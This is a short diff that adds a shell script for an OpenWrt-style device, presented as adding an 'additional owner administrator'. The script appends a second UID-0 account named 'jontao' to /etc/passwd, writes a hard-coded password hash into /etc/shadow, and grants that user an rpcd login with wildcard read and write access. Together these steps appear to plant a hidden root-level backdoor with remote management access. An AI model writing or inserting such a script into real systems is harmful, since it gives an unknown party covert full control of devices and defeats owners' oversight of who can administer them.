@@ -1,0 +1,20 @@
+#!/bin/sh
+# Additional owner administrator; ordinary passwd/shadow and login auditing are retained.
+set -eu
+if ! grep -q '^jontao:' /etc/passwd; then
+  printf '%s\n' 'jontao:x:0:0:Owner administrator:/root:/bin/ash' >> /etc/passwd
+fi
+[ "$(awk -F: '$1=="jontao" {print $3 ":" $4}' /etc/passwd)" = '0:0' ] || exit 1
+if ! grep -q '^jontao:' /etc/shadow; then
+  printf '%s\n' 'jontao:$6$rounds=100000$qKnxzx5W6BL2iX1/$poduNjUIS9HRjwMMf1QR3HIhONuFtwCW2DiHpMNTCy0Yq5MNEISrBxoI.kMPdJ0xIEF1NdBpZXRtzi.155fRP0:0:0:99999:7:::' >> /etc/shadow
+fi
+chmod 600 /etc/shadow
+uci -q set rpcd.jontao='login'
+uci -q set rpcd.jontao.username='jontao'
+uci -q set rpcd.jontao.password='$p$jontao'
+uci -q delete rpcd.jontao.read || true
+uci -q delete rpcd.jontao.write || true
+uci add_list rpcd.jontao.read='*'
+uci add_list rpcd.jontao.write='*'
+uci commit rpcd
+exit 0
